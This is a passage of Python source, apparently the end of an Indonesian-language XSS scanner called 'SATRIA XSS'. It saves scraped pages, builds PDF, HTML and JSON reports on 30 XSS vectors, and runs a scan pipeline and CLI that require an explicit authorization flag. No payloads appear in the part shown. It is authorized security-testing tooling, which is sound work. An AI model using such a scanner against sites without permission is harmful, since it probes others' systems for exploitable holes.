    md_path = artifacts_dir / ("scrape_" + slug + ".md")
    meta_path = artifacts_dir / ("scrape_" + slug + ".meta.json")
    html_path.write_text(str(html_text), encoding="utf-8")
    md_path.write_text(str(markdown_text), encoding="utf-8")
    meta_path.write_text(json.dumps({
        "url": str(url),
        "meta": meta,
        "saved_at": datetime.now(timezone.utc).isoformat(),
        "html_chars": len(str(html_text)),
        "markdown_chars": len(str(markdown_text)),
        "html_sha256": hashlib.sha256(str(html_text).encode("utf-8", "ignore")).hexdigest(),
    }, indent=2, ensure_ascii=False), encoding="utf-8")
    return {"html": html_path, "markdown": md_path, "meta": meta_path}


# ===========================================================================
# PDF: reportlab (berwarna + tabel) dengan fallback multi-halaman
# ===========================================================================
def _summary_from_report(report: dict[str, Any]) -> dict[str, Any]:
    labs = report.get("labs", []) if isinstance(report, dict) else []
    confirmed = [item for item in labs if isinstance(item, dict) and item.get("status") == "confirmed"]
    not_confirmed = [item for item in labs if isinstance(item, dict) and item.get("status") != "confirmed"]
    by_severity: dict[str, int] = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
    for item in confirmed:
        severity = str(item.get("severity", "info")).lower()
        by_severity[severity if severity in by_severity else "info"] += 1
    return {
        "confirmed": len(confirmed),
        "not_confirmed": len(not_confirmed),
        "total": len(labs),
        "confirmed_manual": len(confirmed),
        "candidates_total": len(not_confirmed),
        "observations_total": 0,
        "by_severity": by_severity,
        "triage_by_severity": dict(by_severity),
        "triage_total": len(confirmed),
    }


def _pdf_lab_items(result: dict[str, Any]) -> list[dict[str, Any]]:
    report = result.get("report", {}) if isinstance(result.get("report"), dict) else {}
    labs = report.get("labs") or result.get("labs") or []
    return [item for item in labs if isinstance(item, dict)]


# Warna
_BLUE = (0.043, 0.239, 0.569)
_MID_BLUE = (0.082, 0.396, 0.752)
_WHITE = (1.0, 1.0, 1.0)
_DARK = (0.13, 0.16, 0.20)
_GREY = (0.48, 0.53, 0.58)
_GREEN_TINT = (0.894, 0.957, 0.894)
_STRIPE = (0.965, 0.973, 0.988)


def _pdf_escape_text(text: str) -> str:
    return (str(text).replace("\\", "\\\\").replace("(", "\\(").replace(")", "\\)")
            .replace("\r", " ").replace("\n", " "))


def _pdf_text(x: float, y: float, size: float, text: str, color: tuple[float, float, float],
              bold: bool = False) -> str:
    r, g, b = color
    font = "F2" if bold else "F1"
    return ("BT /" + font + " " + str(size) + " Tf "
            + str(round(r, 3)) + " " + str(round(g, 3)) + " " + str(round(b, 3)) + " rg "
            "1 0 0 1 " + str(round(x, 2)) + " " + str(round(y, 2)) + " Tm ("
            + _pdf_escape_text(text) + ") Tj ET\n")


def _pdf_rect(x: float, y: float, w: float, h: float, color: tuple[float, float, float]) -> str:
    r, g, b = color
    return ("q " + str(round(r, 3)) + " " + str(round(g, 3)) + " " + str(round(b, 3)) + " rg "
            + str(round(x, 2)) + " " + str(round(y, 2)) + " " + str(round(w, 2)) + " "
            + str(round(h, 2)) + " re f Q\n")


def _assemble_pdf(pages: list[str]) -> bytes:
    count = len(pages)
    page_ids = [5 + index * 2 for index in range(count)]
    content_ids = [6 + index * 2 for index in range(count)]
    objects: list[bytes] = []
    objects.append(b"<< /Type /Catalog /Pages 2 0 R >>")
    kids = " ".join(str(pid) + " 0 R" for pid in page_ids)
    objects.append(("<< /Type /Pages /Kids [" + kids + "] /Count " + str(count) + " >>").encode())
    objects.append(b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica /Encoding /WinAnsiEncoding >>")
    objects.append(b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica-Bold /Encoding /WinAnsiEncoding >>")
    for index, content in enumerate(pages):
        data = content.encode("latin-1", "replace")
        objects.append(("<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] "
                        "/Resources << /Font << /F1 3 0 R /F2 4 0 R >> >> "
                        "/Contents " + str(content_ids[index]) + " 0 R >>").encode())
        objects.append(("<< /Length " + str(len(data)) + " >>\nstream\n").encode() + data + b"\nendstream")

    out = bytearray(b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n")
    offsets: list[int] = []
    for number, body in enumerate(objects, start=1):
        offsets.append(len(out))
        out += (str(number) + " 0 obj\n").encode() + body + b"\nendobj\n"
    xref = len(out)
    out += ("xref\n0 " + str(len(objects) + 1) + "\n").encode() + b"0000000000 65535 f \n"
    for offset in offsets:
        out += (("%010d 00000 n \n") % offset).encode()
    out += ("trailer\n<< /Size " + str(len(objects) + 1) + " /Root 1 0 R >>\nstartxref\n"
            + str(xref) + "\n%%EOF\n").encode()
    return bytes(out)


def _render_pdf_fallback(pdf_path: Path, target: str, generated: str,
                         summary: dict[str, Any], labs: list[dict[str, Any]]) -> None:
    """PDF multi-halaman berwarna dengan tabel; SEMUA 30 baris dimasukkan."""
    pages: list[str] = []
    state = {"y": 0.0}

    def start_page(first: bool) -> None:
        content: list[str] = []
        content.append(_pdf_rect(36, 782, 523, 34, _BLUE))
        content.append(_pdf_text(44, 800, 12.5, "SATRIA XSS - Laporan Pemindaian 30 Vektor", _WHITE, bold=True))
        content.append(_pdf_text(44, 787, 7.2, "Cross-Site Scripting assessment (evidence-based)", _WHITE))
        content.append(_pdf_text(40, 766, 7.5, "Target: " + target[:118], _DARK))
        content.append(_pdf_text(40, 755, 7.5, "Digenerate: " + generated[:118], _DARK))
        if first:
            confirmed = summary.get("confirmed_manual", summary.get("confirmed", 0))
            candidates = summary.get("candidates_total", summary.get("not_confirmed", 0))
            content.append(_pdf_rect(40, 731, 515, 16, _STRIPE))
            content.append(_pdf_text(44, 736, 7.6,
                                     "Terkonfirmasi: " + str(confirmed)
                                     + "   |   Kandidat/belum terkonfirmasi: " + str(candidates)
                                     + "   |   Total vektor: 30", _DARK, bold=True))
            top = 716
        else:
            top = 736
        content.append(_pdf_rect(40, top - 14, 515, 14, _MID_BLUE))
        content.append(_pdf_text(44, top - 10, 7, "ID", _WHITE, bold=True))
        content.append(_pdf_text(70, top - 10, 7, "VEKTOR XSS", _WHITE, bold=True))
        content.append(_pdf_text(270, top - 10, 7, "SEV", _WHITE, bold=True))
        content.append(_pdf_text(316, top - 10, 7, "STATUS", _WHITE, bold=True))
        content.append(_pdf_text(392, top - 10, 7, "BUKTI / CATATAN", _WHITE, bold=True))
        pages.append("".join(content))
        state["y"] = top - 20

    start_page(True)
    for index, lab in enumerate(labs):
        confirmed = str(lab.get("status", "")) == "confirmed"
        title_lines = textwrap.wrap(str(lab.get("title", "")), 56) or [""]
        evidence_lines = textwrap.wrap(str(lab.get("evidence", "")) or "-", 50) or ["-"]
        title_lines = title_lines[:4]
        evidence_lines = evidence_lines[:5]
        line_count = max(len(title_lines), len(evidence_lines))
        height = line_count * 9 + 5
        if state["y"] - height < 48:
            start_page(False)
        content = pages[-1]
        top = state["y"]
        background = _GREEN_TINT if confirmed else (_STRIPE if index % 2 else _WHITE)
        content_parts = [_pdf_rect(40, top - height + 2, 515, height, background)]
        content_parts.append(_pdf_text(44, top - 8, 7, str(lab.get("id", "")), _DARK, bold=True))
        for line_index, line in enumerate(title_lines):
            content_parts.append(_pdf_text(70, top - 8 - line_index * 9, 6.8, line, _DARK))
        severity = str(lab.get("severity", "")).upper()
        severity_color = (0.72, 0.11, 0.11) if severity == "CRITICAL" else (
            (0.90, 0.32, 0.0) if severity == "HIGH" else _DARK)
        content_parts.append(_pdf_text(270, top - 8, 6.5, severity[:7], severity_color, bold=True))
        content_parts.append(_pdf_text(316, top - 8, 6.5,
                                       "CONFIRMED" if confirmed else "NOT CONFIRMED",
                                       (0.10, 0.36, 0.12) if confirmed else _GREY,
                                       bold=confirmed))
        for line_index, line in enumerate(evidence_lines):
            content_parts.append(_pdf_text(392, top - 8 - line_index * 9, 6.2, line, _DARK))
        pages[-1] = content + "".join(content_parts)
        state["y"] = top - height

    total = len(pages)
    for number, content in enumerate(pages, start=1):
        footer = _pdf_text(40, 26, 6.5,
                           "SATRIA XSS v" + __version__ + "  |  halaman " + str(number) + "/" + str(total)
                           + "  |  gunakan hanya pada aset berizin", _GREY)
        pages[number - 1] = content + footer

    pdf_path.write_bytes(_assemble_pdf(pages))


def render_pdf(result: dict[str, Any], path: str | None = None) -> Path:
    pdf_path = Path(path or str(globals().get("OUTPUT_PDF") or OUTPUT_PDF)).expanduser()
    if not pdf_path.is_absolute():
        pdf_path = (Path.cwd() / pdf_path).resolve()
    pdf_path.parent.mkdir(parents=True, exist_ok=True)

    report = result.get("report", {}) if isinstance(result.get("report"), dict) else {}
    source = report if report else result
    summary = result.get("summary") if isinstance(result.get("summary"), dict) else _summary_from_report(source)
    labs = _pdf_lab_items(result)
    # Pastikan selalu ada 30 baris (lengkapi dari katalog bila data kurang).
    by_id = {int(item.get("id", 0)): item for item in labs if str(item.get("id", "")).isdigit()}
    labs = [by_id.get(lab_id, {
        "id": lab_id, "title": title, "severity": severity,
        "status": "not_confirmed", "evidence": "Tidak ada data.",
    }) for lab_id, title, _key, severity in CATALOG]

    target = str(result.get("target") or source.get("target") or "-")
    generated = str(result.get("generated_at") or source.get("generated_at") or "")
    if "T" in generated:
        generated = generated.replace("T", " ").split(".")[0]

    produced = False
    try:
        from reportlab.lib import colors
        from reportlab.lib.enums import TA_CENTER
        from reportlab.lib.pagesizes import A4
        from reportlab.lib.styles import ParagraphStyle, getSampleStyleSheet
        from reportlab.lib.units import cm
        from reportlab.platypus import Paragraph, SimpleDocTemplate, Spacer, Table, TableStyle

        document = SimpleDocTemplate(str(pdf_path), pagesize=A4, leftMargin=1.4 * cm,
                                     rightMargin=1.4 * cm, topMargin=1.3 * cm, bottomMargin=1.3 * cm)
        styles = getSampleStyleSheet()
        title_style = ParagraphStyle("T", parent=styles["Title"], textColor=colors.HexColor("#0b3d91"),
                                     fontSize=17, alignment=TA_CENTER)
        sub_style = ParagraphStyle("S", parent=styles["Normal"], alignment=TA_CENTER,
                                   fontSize=8.5, textColor=colors.HexColor("#444444"))
        head_style = ParagraphStyle("H", parent=styles["Heading2"], textColor=colors.HexColor("#0b3d91"),
                                    fontSize=11.5, spaceBefore=8, spaceAfter=4)
        cell_style = ParagraphStyle("C", parent=styles["Normal"], fontSize=7.2, leading=9)

        story: list[Any] = [
            Paragraph("SATRIA XSS &mdash; Laporan Pemindaian 30 Vektor", title_style),
            Paragraph("Target: " + html_module.escape(target) + "<br/>Digenerate: "
                      + html_module.escape(generated) + " | Cakupan: 30 vektor XSS", sub_style),
            Spacer(1, 8),
            Paragraph("Ringkasan Hasil", head_style),
        ]
        severity_map = summary.get("by_severity") or {}
        summary_rows = [["Metrik", "Nilai"],
                        ["Terkonfirmasi", str(summary.get("confirmed_manual", summary.get("confirmed", 0)))],
                        ["Kandidat / belum terkonfirmasi", str(summary.get("candidates_total", 0))],
                        ["Total vektor", "30"],
                        ["Critical", str(severity_map.get("critical", 0))],
                        ["High", str(severity_map.get("high", 0))],
                        ["Medium", str(severity_map.get("medium", 0))],
                        ["Low", str(severity_map.get("low", 0))],
                        ["Info", str(severity_map.get("info", 0))]]
        summary_table = Table(summary_rows, colWidths=[5.2 * cm, 11.2 * cm])
        summary_table.setStyle(TableStyle([
            ("BACKGROUND", (0, 0), (-1, 0), colors.HexColor("#0b3d91")),
            ("TEXTCOLOR", (0, 0), (-1, 0), colors.white),
            ("FONTNAME", (0, 0), (-1, 0), "Helvetica-Bold"),
            ("BACKGROUND", (0, 1), (0, -1), colors.HexColor("#e8f0fe")),
            ("FONTNAME", (0, 1), (0, -1), "Helvetica-Bold"),
            ("FONTSIZE", (0, 0), (-1, -1), 8),
            ("GRID", (0, 0), (-1, -1), 0.5, colors.HexColor("#9bb3d1")),
            ("PADDING", (0, 0), (-1, -1), 4),
        ]))
        story.append(summary_table)
        story.append(Paragraph("Detail 30 Vektor XSS", head_style))

        rows: list[list[Any]] = [["ID", "Vektor", "Sev", "Status", "Bukti / catatan"]]
        for lab in labs:
            rows.append([
                str(lab.get("id", "")),
                Paragraph(html_module.escape(str(lab.get("title", ""))), cell_style),
                str(lab.get("severity", "")).upper(),
                "CONFIRMED" if lab.get("status") == "confirmed" else "NOT CONFIRMED",
                Paragraph(html_module.escape(str(lab.get("evidence", "")) or "-"), cell_style),
            ])
        detail_table = Table(rows, colWidths=[0.9 * cm, 5.6 * cm, 1.4 * cm, 2.3 * cm, 6.2 * cm],
                             repeatRows=1, splitByRow=1)
        table_style = [
            ("BACKGROUND", (0, 0), (-1, 0), colors.HexColor("#1565c0")),
            ("TEXTCOLOR", (0, 0), (-1, 0), colors.white),
            ("FONTNAME", (0, 0), (-1, 0), "Helvetica-Bold"),
            ("FONTSIZE", (0, 0), (-1, -1), 7),
            ("GRID", (0, 0), (-1, -1), 0.4, colors.HexColor("#b0bec5")),
            ("VALIGN", (0, 0), (-1, -1), "TOP"),
            ("PADDING", (0, 0), (-1, -1), 3),
        ]
        for row_index, lab in enumerate(labs, start=1):
            if lab.get("status") == "confirmed":
                table_style.append(("BACKGROUND", (0, row_index), (-1, row_index), colors.HexColor("#e8f5e9")))
                table_style.append(("TEXTCOLOR", (3, row_index), (3, row_index), colors.HexColor("#1b5e20")))
            elif row_index % 2 == 0:
                table_style.append(("BACKGROUND", (0, row_index), (-1, row_index), colors.HexColor("#fafafa")))
        detail_table.setStyle(TableStyle(table_style))
        story.append(detail_table)
        story.append(Spacer(1, 8))
        story.append(Paragraph(
            "<b>Catatan:</b> 'confirmed' berarti bukti kontekstual terdeteksi (payload ter-refleksi pada konteks "
            "berbahaya, atau bukti sink/sumber DOM yang jelas, atau kontrol blokir + bypass yang berhasil). "
            "'not_confirmed' berarti bukti tidak cukup - bukan klaim aman. Validasi manual tetap diperlukan.",
            ParagraphStyle("N", parent=styles["Normal"], fontSize=7.2, leading=9, textColor=colors.HexColor("#333333"))))
        document.build(story)
        produced = True
    except Exception:
        produced = False

    if not produced:
        _render_pdf_fallback(pdf_path, target, generated, summary, labs)

    data = pdf_path.read_bytes() if pdf_path.exists() else b""
    if not data.startswith(b"%PDF") or len(data) < 1000:
        _render_pdf_fallback(pdf_path, target, generated, summary, labs)
    return pdf_path


def write_report(report: dict[str, Any], output_dir: Path) -> tuple[Path, Path]:
    output_dir.mkdir(parents=True, exist_ok=True)
    json_path = output_dir / "satria_xss_report.json"
    html_path = output_dir / "satria_xss_report.html"
    json_path.write_text(json.dumps(report, indent=2, ensure_ascii=False), encoding="utf-8")
    rows = []
    for item in report.get("labs", []):
        rows.append("<tr><td>" + str(item.get("id")) + "</td><td>"
                    + html_module.escape(str(item.get("title", ""))) + "</td><td>"
                    + html_module.escape(str(item.get("severity", ""))) + "</td><td>"
                    + html_module.escape(str(item.get("status", ""))) + "</td><td>"
                    + html_module.escape(str(item.get("evidence", ""))[:400]) + "</td></tr>")
    html = ("<html><head><meta charset='utf-8'><title>SATRIA XSS Report</title></head><body>"
            "<h2>SATRIA XSS Report</h2><p>Target: "
            + html_module.escape(str(report.get("target", "")))
            + "</p><table border='1' cellpadding='4' cellspacing='0'>"
            "<tr><th>ID</th><th>Vektor</th><th>Severity</th><th>Status</th><th>Bukti</th></tr>"
            + "".join(rows) + "</table></body></html>")
    html_path.write_text(html, encoding="utf-8")
    return json_path, html_path


def _scrape_url(scrape_data: dict[str, Any] | None) -> str | None:
    if not isinstance(scrape_data, dict):
        return None
    meta = scrape_data.get("meta") if isinstance(scrape_data.get("meta"), dict) else {}
    for candidate in (meta.get("url"), scrape_data.get("url"),
                      scrape_data.get("target"), scrape_data.get("target_url")):
        if isinstance(candidate, str) and candidate.strip():
            return candidate.strip()
    return None


def _scrape_html(scrape_data: dict[str, Any] | None) -> str | None:
    if not isinstance(scrape_data, dict):
        return None
    data = scrape_data.get("data") if isinstance(scrape_data.get("data"), dict) else scrape_data
    for key in ("html", "html-llm"):
        value = data.get(key) if isinstance(data, dict) else None
        if isinstance(value, str) and value.strip():
            return value
    return None


def run_pipeline(scrape_data: dict[str, Any] | None = None, *, url: str | None = None,
                 html: str | None = None, authorized: bool | None = None,
                 http_result: dict[str, Any] | None = None,
                 allow_partial_tools: bool | None = None,
                 enable_llm: bool | None = None, run_censys: bool | None = None,
                 run_nvd: bool | None = None, **runtime_options: Any) -> dict[str, Any]:
    overrides: dict[str, Any] = dict(runtime_options)
    for name, value in (("allow_partial_tools", allow_partial_tools),
                        ("enable_llm", enable_llm), ("run_censys", run_censys),
                        ("run_nvd", run_nvd), ("authorized", authorized)):
        if value is not None:
            overrides[name] = value
    if overrides:
        configure_runtime(**overrides)

    permitted = authorized if authorized is not None else bool(globals().get("ACTIVE_SCAN_AUTHORIZED"))
    if not permitted:
        raise RuntimeError("Pemindaian aktif memerlukan authorized=True (otorisasi wajib diberikan).")

    target_url = url or _scrape_url(scrape_data) or ""
    if not target_url:
        raise RuntimeError("URL target tidak ditemukan pada scrape_data/url.")

    if scrape_data is not None and _scrape_html(scrape_data):
        try:
            persist_scrape_artifacts(scrape_data)
        except Exception:
            pass

    report = scan_target(
        target_url,
        authorized=True,
        allow_private=False,
        seed_html=html or _scrape_html(scrape_data),
    )
    summary = _summary_from_report(report)
    result: dict[str, Any] = {
        "target": report.get("target", target_url),
        "generated_at": report.get("generated_at"),
        "mode": "active",
        "labs": report.get("labs", []),
        "report": report,
        "summary": summary,
        "sections": {"http": [], "code": [], "portswigger": []},
        "errors": report.get("scan_stats", {}).get("errors", []),
    }

    try:
        findings_path = Path(globals().get("FINDINGS_PATH")
                             or Path(globals().get("ARTIFACTS_DIR", Path("artifacts"))) / "findings.json").expanduser()
        if not findings_path.is_absolute():
            findings_path = (Path.cwd() / findings_path).resolve()
        findings_path.parent.mkdir(parents=True, exist_ok=True)
        findings_path.write_text(json.dumps(result, indent=2, ensure_ascii=False), encoding="utf-8")
    except Exception as exc:
        result.setdefault("errors", []).append("findings.json: " + str(exc))

    pdf_path = render_pdf(result, str(globals().get("OUTPUT_PDF") or "artifacts/laporan_kerentanan.pdf"))
    globals()["OUTPUT_PDF"] = str(pdf_path)
    return result


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="SATRIA XSS - pemindai 30 vektor XSS")
    parser.add_argument("target", help="URL target HTTP/HTTPS")
    parser.add_argument("--authorized", action="store_true", help="Wajib: Anda memiliki izin pengujian.")
    parser.add_argument("--allow-private", action="store_true", help="Izinkan target lokal/privat.")
    parser.add_argument("--max-pages", type=int, default=10)
    parser.add_argument("--max-points", type=int, default=24)
    parser.add_argument("--max-requests", type=int, default=900)
    parser.add_argument("--timeout", type=float, default=8.0)
    parser.add_argument("--output-dir", default="satria_xss_report")
    args = parser.parse_args(argv)
    if not args.authorized:
        parser.error("Pengujian aktif memerlukan --authorized.")
    try:
        report = scan_target(
            args.target, authorized=True, allow_private=args.allow_private,
            max_pages=args.max_pages, max_points=args.max_points,
            max_requests=args.max_requests, timeout=args.timeout,
        )
    except Exception as exc:
        print("[error] " + type(exc).__name__ + ": " + str(exc), file=sys.stderr)
        return 1
    json_path, html_path = write_report(report, Path(args.output_dir))
    summary = report.get("summary", {})
    print("SATRIA XSS selesai: " + str(summary.get("confirmed", 0)) + "/30 vektor terkonfirmasi.")
    print("JSON: " + str(json_path))
    print("HTML: " + str(html_path))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
